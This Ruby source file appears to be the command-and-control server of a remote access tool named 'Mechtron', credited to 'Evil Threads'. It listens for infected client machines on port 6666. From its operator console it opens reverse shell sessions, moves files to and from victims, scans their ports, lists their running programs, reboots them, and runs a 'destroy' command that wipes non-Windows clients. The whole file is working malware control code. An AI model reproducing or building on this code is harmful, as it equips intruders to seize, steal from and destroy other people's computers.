=begin
Copyright 2023 Chris Basinger

Licensed under the Apache License, Version 2.0(the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
=end
require 'terminal-table'
require 'socket'
require 'singleton'
require_relative 'commands'
require_relative 'client'
require_relative 'constants'
# Handles connections and contains the clients
class Server
  include Singleton
  attr_accessor :clients
  @@help_table = Terminal::Table.new(:title => 'HELP', :headings => ['COMMAND', 'DESCRIPTION']) do |t|
    t << ['clients', 'List all of the connected machines']
    t << :separator
    t << ['session IP', 'starts a reverse shell session. Enter "exit" to stop']
    t << :separator
    t << ['get IP FILE FORMAT', 'Download files. Format options are binary and text.']
    t << :separator
    t << ['put IP FILE FORMAT', 'Upload files. Format options are binary and text.']
    t << :separator
    t << ['scan IP', 'Scan all of the ports on client machine']
    t << :separator
    t << ['latency IP', 'Get the speed of the connection']
    t << :separator
    t << ['programs IP', 'Get a list of the running programs']
    t << :separator
    t << ['uptime IP', 'Uptime in minutes']
    t << :separator
    t << ['reboot IP', 'reboots the client']
    t << :separator
    t << ['destroy IP', 'destroys the client machine']
    t << :separator
    t << ['help', 'shows the HELP menu']
    t << :separator
    t << ['exit', 'Closes Mechtron application']
  end
  def initialize(port = 6666)
    @clients = []
    @port = port
  end

  #starts the server. This handles adding new connections.
  def start
    puts "starting server on port #{@port}"
    puts "version #{$VERSION}"
    puts 'Useful tip: You can use the client ID in place of the IP!'
    puts $BANNER
    puts 'By Evil Threads'
    puts
    Thread.new do
      server = TCPServer.new(@port)
      loop do
        client = Client.new(server.accept)
        client.name = client.gets
        client.platform = client.gets
        @clients << client
        puts "#{client.to_s} joined"
      end
    end
    clients_heartbeat
    handle_commands
  end

  # handles user input for executing commands
  def handle_commands
    loop do
      command, ip, file, format = STDIN.gets.chomp.split(" ")
      if command
        if command.downcase == 'exit'
          puts 'exiting the server..'
          break
        end
        case command.downcase
        when "clients"
          Commands.clients_table @clients
        when 'session'
          client = find_client ip
          if client
            Commands.session(client)
          else
            puts 'invalid IP or ID'
          end
        when 'get'
          client = find_client ip
          if client
            Commands.get(client, file, format)
          else
            puts 'invalid IP or ID'
          end
        when 'put'
          client = find_client ip
          if client
            Commands.put(client, file, format)
          else
            puts 'invalid IP or ID'
          end
        when 'help'
          puts @@help_table
        when 'scan'
          client = find_client ip
          if client
            Commands.scan client
          else
            puts 'invalid IP or ID'
          end
        when 'latency'
          client = find_client ip
          if client
            Commands.latency client
          else
            puts 'invalid IP or ID'
          end
        when 'programs'
          client = find_client ip
          if client
            Commands.programs client
          else
            puts 'invalid IP or ID'
          end
        when 'uptime'
          client = find_client ip
          if client
            Commands.uptime client
          else
            puts 'invalid IP or ID'
          end
        when 'reboot'
          client = find_client ip
          if client
            Commands.reboot client
          else
            puts 'invalid IP or ID'
          end
        when 'destroy'
          client = find_client ip
          if client
            if client.platform != 'Windows'
              Commands.destroy client
            else
              puts 'Command not supported on Windows clients.'
            end
          else
            puts 'invalid IP or ID'
          end
        else
          puts 'invalid command'
        end
      end
    end
  end

  def find_client(ip)
    if ip.include? '.'
      client = findClientByIp(ip)
    else
      client = findClientById(ip)
    end
    return client
  end

  # returns the client matching the ip address
  def findClientByIp(ip)
    @clients.each do |client|
      if client.ip == ip
        return client
      end
    end
    return nil
  end

  def findClientById(id)
    @clients.each do |client|
      if client.id == id.to_i
        return client
      end
    end
    return nil
  end


#its not really a heartbeat. more in reverse.
  def clients_heartbeat
    Thread.new do
      loop do
        sleep 1
        @clients.each do |client|
          begin
            TCPSocket.new(client.ip, 7777).close
          rescue Errno::ECONNREFUSED
            if !client.in_session
              puts "#{client.to_s} disconnected"
              client.sock.close
              @clients.delete client
            end
          end
        end
      end
    end
  end
end